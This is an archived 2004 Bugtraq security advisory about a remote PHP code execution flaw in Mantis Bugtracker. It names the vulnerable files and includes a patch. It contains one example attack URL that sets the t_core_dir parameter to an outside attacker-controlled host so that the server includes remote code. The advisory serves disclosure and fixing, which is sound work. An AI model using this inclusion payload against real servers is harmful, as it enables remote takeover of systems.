=== Content from marc.info_3f408fdb_20250124_211622.html ===

```
[[prev in list](?l=bugtraq&m=109314495007280&w=2)] [[next in list](?l=bugtraq&m=109312475207604&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Mantis Bugtracker Remote PHP Code Execution Vulnerability
From:       [Jose Antonio <joxeankoret () yahoo ! es>](?a=109312245200001&r=1&w=2)
Date:       [2004-08-20 23:05:41](?l=bugtraq&r=1&w=2&b=200408)
Message-ID: [20040820230541.11256.qmail () www ! securityfocus ! com](?i=20040820230541.11256.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=109313416727851&q=mbox) or [body](?l=bugtraq&m=109313416727851&q=raw)]

---------------------------------------------------------------------------
           Mantis Bugtracker Remote PHP Code
Execution Vulnerability
---------------------------------------------------------------------------

Author: Joxean Koret
Date: 08-01-2004
Location: Basque Country

---------------------------------------------------------------------------

Affected software description:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mantis Bugtracker

Mantis is a web-based bugtracking system. It is
written in the PHP scripting
language and requires the MySQL database and
a webserver.

---------------------------------------------------------------------------

Vulnerabilities:
~~~~~~~~~~~~~~~~

A. Remote PHP Code Execution Vulnerability

A1. If the REGISTER_GLOBAL variable is set an
attacker can execute arbitrary
php code by overwriting the global variable
$t_core_dir with our desired url
(for example
<http://localhost/mantis/core/bug_api.php?t_core_dir=http://fucking.site.com/>)

 The following files are vulnerables :

 bug_api.php -> at line 22? (using variable
$t_core_path)
 relationship_api.php -> Line 14 (using variable
$t_core_dir)

The fix:
~~~~~~~~

Both of these issues have now been fixed in
CVS.

There is also a Patch for the Mantis 0.19.0a
version

=====================================================================
mantis.patch

bug_api.php
 @@ -19,7 +19,7 @@
      require_once( $t_core_dir .
'sponsorship_api.php' );

      # MASC RELATIONSHIP
 -
require_once( $t_core_path.'relationship_api.php' );
 +
require_once( $t_core_dir.'relationship_api.php' );
      # MASC RELATIONSHIP

 and to relationship API:
      ### Relationship API ###

 + $t_core_dir =
dirname( __FILE__ ).DIRECTORY_SEPARATOR;
 +
      require_once( $t_core_dir .
'collapse_api.php' );

      # MASC RELATIONSHIP

=====================================================================
---------------------------------------------------------------------------
Contact:
~~~~~~~~

	Joxean Koret at
joxeanpiti<<<<<<<<@>>>>>>>>yah00<<<<<<dot>>>>>es

[[prev in list](?l=bugtraq&m=109314495007280&w=2)] [[next in list](?l=bugtraq&m=109312475207604&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


